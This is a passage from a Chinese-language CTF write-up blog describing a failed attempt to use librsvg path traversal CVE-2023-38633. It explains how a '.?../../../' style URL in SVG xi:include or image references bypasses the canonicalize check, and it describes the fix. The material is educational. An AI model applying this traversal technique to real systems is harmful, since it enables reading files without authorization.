<h4 class="anchor anchorWithStickyNavbar_LWe7" id="失败的尝试librsvg路径穿越cve-2023-38633环境版本已修复">失败的尝试：librsvg路 径穿越（CVE-2023-38633，环境版本已修复）<a href="#失败的尝试librsvg路径穿越cve-2023-38633环境版本已修复" class="hash-link" aria-label="失败的尝试：librsvg路径穿越（CVE-2023-38633，环境版本已修复）的直接链接" title="失败的尝试：librsvg路径穿越（CVE-2023-38633，环境版本已修复）的直接链接">​</a></h4>
<p>为什么会考虑这个，是因为我偶然发现，好像环境的<code>librsvg</code>有点旧啊？</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> /lib </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> librsvg*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/lib/x86_64-linux-gnu/librsvg.2.48.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>然而事实上文件名的版本号是不对的。真正看版本最好的方式是<code>apt list|grep librsvg</code>，可以看到是<code>2.54.7</code>，是一个被作  者把补丁backport回来的版本。</p>
</blockquote>
<p>而刚好2.56.3版本有个SVG路径穿越<a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/" target="_blank" rel="noopener noreferrer">CVE-2023-38633</a>。原本SVG要引用外部内容，librsvg会利用Rust的<code>std::fs::canonicalize</code>检查被引用的内容是否在SVG本身的父目录中。原本这个过程会把软连接、<code>../</code>这种给去掉，但这个<code>canonicalize</code>似乎原本不是处理Unix文件系统而是处理URL的（虽然<code>file://</code>也算一种URL，但最终是要调用Unix文件系统），这个过程中会把<code>?, #</code>部分给截掉，但是最后读取文件时用的又是原本的URL，这就导致了类似<code>.?../../../</code>这个东西，在<code>canonicalize</code>里相当于个<code>.</code>，自然属于当前目录，但在文件系统里相当于<code>.?..</code>相当于一级路径，并且会和后面一个<code>../</code>中和掉，后面的部分都会被拼接到路径里，造成路径穿越。解决方案就是不允许在SVG的URL中包含任何<code>?, #, @</code>等符号，同时传给文件系统的也必须是<code>canonicalize</code>后的路径。</p>
<p>当然<code>xi:include</code>和<code>image</code>标签，有理由相信他们检查URL的方法是一样的，一个能打，另一个也能。当然，做这个题的时候都打不通就是了。</p>
<p>在调试这个题的过程，我第一次使用strace去看系统调用，看文件读取细节，虽然没实质性作用，但还是让我稍微理解了一点librsvg的工作流程。</p></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a title="Catch-The-Flag contests writeups / learning notes" class="tag_zVej tagRegular_sFm0" href="/ctf-writeup/tags/ctf">CTF</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="博文分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/ctf-writeup/2024/05/13/TBTLCTF2024"><div class="pagination-nav__sublabel">较新一篇</div><div class="pagination-nav__label">squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/ctf-writeup/2024/04/02/UTCTF2024"><div class="pagination-nav__sublabel">较旧一篇</div><div class="pagination-nav__label">UTCTF 2024 个人题解</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ritsecctf-2024--damctf-2024--geekctf-2024-个人writeup" class="table-of-contents__link toc-highlight">RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup</a></li><li><a href="#ritsecctf-2024" class="table-of-contents__link toc-highlight">RitsecCTF 2024</a></li><li><a href="#crypto---dastardly-evil-scientists" class="table-of-contents__link toc-highlight">crypto - Dastardly Evil Scientists</a></li><li><a href="#crypto---failed-file-transfer" class="table-of-contents__link toc-highlight">crypto - Failed File Transfer</a></li><li><a href="#crypto---flag-distribution-server" class="table-of-contents__link toc-highlight">crypto - Flag Distribution Server</a></li><li><a href="#rev---go-go-gadget" class="table-of-contents__link toc-highlight">rev - Go Go Gadget</a></li><li><a href="#pwn---the-gumponent" class="table-of-contents__link toc-highlight">pwn - The Gumponent</a></li><li><a href="#web---warm-up-beep-boop" class="table-of-contents__link toc-highlight">web - [Warm Up] Beep Boop</a></li><li><a href="#web---toon-town-fan-club" class="table-of-contents__link toc-highlight">web - Toon Town Fan Club</a></li><li><a href="#web---leaked-login" class="table-of-contents__link toc-highlight">web - Leaked Login</a></li><li><a href="#damctf-2024" class="table-of-contents__link toc-highlight">DamCTF 2024</a></li><li><a href="#web-flower" class="table-of-contents__link toc-highlight">web-flower</a></li><li><a href="#web---tararchive" class="table-of-contents__link toc-highlight">web - tararchive</a></li><li><a href="#misc---gitlabrunner-incomplete" class="table-of-contents__link toc-highlight">misc - gitlabrunner (incomplete)</a></li><li><a href="#rev---ssh-incomplete" class="table-of-contents__link toc-highlight">rev - ssh (incomplete)</a></li><li><a href="#geekctf-2024" class="table-of-contents__link toc-highlight">GeekCTF 2024</a></li><li><a href="#misc---boys-bullet" class="table-of-contents__link toc-highlight">misc - Boy&#39;s Bullet</a></li><li><a href="#misc---f-and-r" class="table-of-contents__link toc-highlight">misc - f and r</a></li><li><a href="#misc---real-or-not-1" class="table-of-contents__link toc-highlight">misc - real or not 1</a></li><li><a href="#misc---whereismyflag" class="table-of-contents__link toc-highlight">misc - whereismyflag</a></li><li><a href="#pwn---memo系列23" class="table-of-contents__link toc-highlight">pwn - memo系列（2/3）</a></li><li><a href="#pwn-flat" class="table-of-contents__link toc-highlight">pwn-flat</a></li><li><a href="#pwn-shellcode" class="table-of-contents__link toc-highlight">pwn-shellcode</a></li><li><a href="#rev---peertrace未做出" class="table-of-contents__link toc-highlight">rev - peertrace（未做出）</a></li><li><a href="#web---yajf" class="table-of-contents__link toc-highlight">web - YAJF</a></li><li><a href="#web---secrets" class="table-of-contents__link toc-highlight">web - secrets</a></li><li><a href="#web---picbed" class="table-of-contents__link toc-highlight">web - picbed</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>